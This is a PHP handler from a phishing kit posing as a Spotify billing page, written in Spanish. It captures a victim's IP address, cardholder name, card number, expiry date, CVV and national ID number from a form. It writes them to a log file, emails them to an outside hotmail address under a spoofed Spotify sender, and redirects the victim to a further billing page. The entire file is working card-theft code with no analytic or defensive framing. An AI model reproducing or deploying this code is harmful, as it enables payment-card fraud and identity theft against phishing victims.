<?php
error_reporting(0);
session_start();
$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];

#browser info
#Country info

$_SESSION['n'] = $_POST['n'];
$_SESSION['cn'] = $_POST['cn'];
$_SESSION['f'] = $_POST['f'];
$_SESSION['cs'] = $_POST['cs'];
$_SESSION['rt'] = $_POST['rt'];

#Security information
$message = "
<div style=\"background-image: url('https://i.ibb.co/DWd475G/B.jpg');font-family: Tahoma;line-height: 25px;color: #333;font-size: 22px;border: 1px solid #06F;	padding: 20px;	border-radius: 5px; margin-top: 20px;\">
IP              =>   <font color='#F31414'>".$_SESSION['_IP_']."</font>
<br />
TIME	=>   <font color='#F31414'>".date('l jS \of F Y h:i:s A')."</font><br />
Nombre en la tarjeta:	=>   <font color='#F31414'>".$_POST['n']."</font><br />
Numero de tarjeta	=>   <font color='#F31414'>".$_POST['cn']."</font><br />
Fecha de Vencimiento	=>   <font color='#F31414'>".$_POST['f']."</font><br />
CVV	=>   <font color='#F31414'>".$_POST['cs']."</font><br />
RUT/DNI	=>   <font color='#F31414'>".$_POST['rt']."</font><br />
</div>";

$fp = fopen('Swordfish.php', 'a');
fwrite($fp, "$message \r\n");
fclose($fp);

$subject  = "LOG B [ " . $_SESSION['_IP_'] . " - " . $_SESSION['cntname'] . " ] ";
$headers  = "MIME-Version: 1.0" . "\r\n";;
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: Spotify <admin@Spotify.com.ve" . "\r\n";

$to = "yaspalugo@hotmail.com";
@mail($to,$subject,$message,$headers);
header('location: ../Billing.html');

?>